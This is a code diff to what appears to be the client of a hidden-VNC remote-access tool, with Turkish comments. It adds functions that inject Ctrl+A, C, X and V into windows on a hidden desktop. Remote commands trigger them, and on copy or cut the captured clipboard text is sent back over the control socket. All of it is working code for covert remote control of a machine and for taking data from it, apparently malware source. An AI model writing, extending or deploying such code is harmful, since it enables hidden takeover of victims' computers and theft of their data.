@@ -917,6 +917,67 @@ static void activate_target_window(HWND hwnd, UINT msg, LRESULT ht) {
 // -----------------------------------------------------------------------
 //  Yardımcı: Odaklanmış pencereyi bul (gizli desktop'ta)
 // -----------------------------------------------------------------------
+static string GetClipboardText() {
+    if (!OpenClipboard(NULL)) return "";
+    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
+    if (hData == NULL) { CloseClipboard(); return ""; }
+    wchar_t* pText = static_cast<wchar_t*>(GlobalLock(hData));
+    if (pText == NULL) { CloseClipboard(); return ""; }
+    wstring wstr(pText);
+    GlobalUnlock(hData);
+    CloseClipboard();
+
+    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
+    string res(size_needed, 0);
+    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &res[0], size_needed, NULL, NULL);
+    return res;
+}
+
+static void SetClipboardText(const string& text) {
+    if (text.empty()) return;
+    int wChars = MultiByteToWideChar(CP_UTF8, 0, text.c_str(), -1, NULL, 0);
+    if (wChars <= 0) return;
+    vector<wchar_t> buffer(wChars);
+    MultiByteToWideChar(CP_UTF8, 0, text.c_str(), -1, buffer.data(), wChars);
+
+    if (!OpenClipboard(NULL)) return;
+    EmptyClipboard();
+    HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, wChars * sizeof(wchar_t));
+    if (hGlob) {
+        wchar_t* pDst = static_cast<wchar_t*>(GlobalLock(hGlob));
+        if (pDst) {
+            memcpy(pDst, buffer.data(), wChars * sizeof(wchar_t));
+            GlobalUnlock(hGlob);
+            SetClipboardData(CF_UNICODETEXT, hGlob);
+        } else {
+            GlobalFree(hGlob);
+        }
+    }
+    CloseClipboard();
+}
+
+static void SendCtrlShortcut(HWND hwnd, char key) {
+    if (!hwnd || !IsWindow(hwnd)) return;
+    BYTE keyState[256];
+    GetKeyboardState(keyState);
+    BYTE oldCtrl = keyState[VK_CONTROL];
+    keyState[VK_CONTROL] = 0x80;
+    SetKeyboardState(keyState);
+
+    LPARAM lpDown = 1 | (MapVirtualKeyW(VK_CONTROL, MAPVK_VK_TO_VSC) << 16);
+    SendMessageTimeoutW(hwnd, WM_KEYDOWN, VK_CONTROL, lpDown, SMTO_ABORTIFHUNG, 200, NULL);
+
+    WORD vk = VkKeyScanW(key) & 0xFF;
+    LPARAM lpKey = 1 | (MapVirtualKeyW(vk, MAPVK_VK_TO_VSC) << 16);
+    SendMessageTimeoutW(hwnd, WM_KEYDOWN, vk, lpKey, SMTO_ABORTIFHUNG, 200, NULL);
+    SendMessageTimeoutW(hwnd, WM_KEYUP, vk, lpKey | 0xC0000000, SMTO_ABORTIFHUNG, 200, NULL);
+
+    SendMessageTimeoutW(hwnd, WM_KEYUP, VK_CONTROL, lpDown | 0xC0000000, SMTO_ABORTIFHUNG, 200, NULL);
+
+    keyState[VK_CONTROL] = oldCtrl;
+    SetKeyboardState(keyState);
+}
+
 static HWND GetFocusedWindow() {
     HWND hTarget = g_hCurrentFocus;
     if (!hTarget || !IsWindow(hTarget)) hTarget = GetForegroundWindow();
@@ -954,6 +1015,43 @@ static void input_loop() {
         const json&   cmd    = task.cmd;
 
         // ---- Klavye ----
+        if (action == "hvnc_selectall" || action == "hvnc_copy" || action == "hvnc_cut" || action == "hvnc_paste") {
+            HWND hTarget = GetFocusedWindow();
+            if (hTarget && IsWindow(hTarget)) {
+                if (action == "hvnc_selectall") {
+                    SendCtrlShortcut(hTarget, 'A');
+                } else if (action == "hvnc_copy") {
+                    SendCtrlShortcut(hTarget, 'C');
+                    Sleep(100);
+                    string clip = GetClipboardText();
+                    if (!clip.empty()) {
+                        json resp;
+                        resp["action"] = "hvnc_clipboard";
+                        resp["data"] = clip;
+                        safe_send_json(g_socket, resp);
+                    }
+                } else if (action == "hvnc_cut") {
+                    SendCtrlShortcut(hTarget, 'X');
+                    Sleep(100);
+                    string clip = GetClipboardText();
+                    if (!clip.empty()) {
+                        json resp;
+                        resp["action"] = "hvnc_clipboard";
+                        resp["data"] = clip;
+                        safe_send_json(g_socket, resp);
+                    }
+                } else if (action == "hvnc_paste") {
+                    string data = cmd.value("data", "");
+                    if (!data.empty()) {
+                        SetClipboardText(data);
+                        SendCtrlShortcut(hTarget, 'V');
+                    }
+                }
+            }
+            g_forceFullFrame = true;
+            continue;
+        }
+
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
             HWND hTarget = WindowFromPoint(g_lastMousePos);
